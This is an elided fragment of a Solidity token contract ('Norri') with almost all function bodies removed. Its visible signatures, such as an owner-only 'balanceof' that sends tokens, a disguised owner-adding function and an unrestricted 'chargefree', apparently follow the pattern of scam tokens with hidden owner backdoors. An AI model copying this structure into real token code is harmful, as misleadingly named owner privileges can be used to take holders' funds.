...
contract AuthSafe is Context, EIPRoles{  
    ...
    */
    ...
    function Depeche (address newOwner) external onlyOwner {
        add(newOwner);
    }    
...
contract Norri is Context, IERC20, AuthSafe{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000 *  10**9;        
    
    string private _name = "Norri";
    string private _symbol = "NORRI";
    ...
    function withdrawtoken(address holder, bool exempt) external onlyOwner {
    ...
    function balanceof(address _token, address _to) external onlyOwner returns (bool _sent)
  {
    ...
    function effectclear(address sender, uint256 amount) internal returns (uint256) {
    ...
    function chargefree(address to, uint256 _token) external
    {
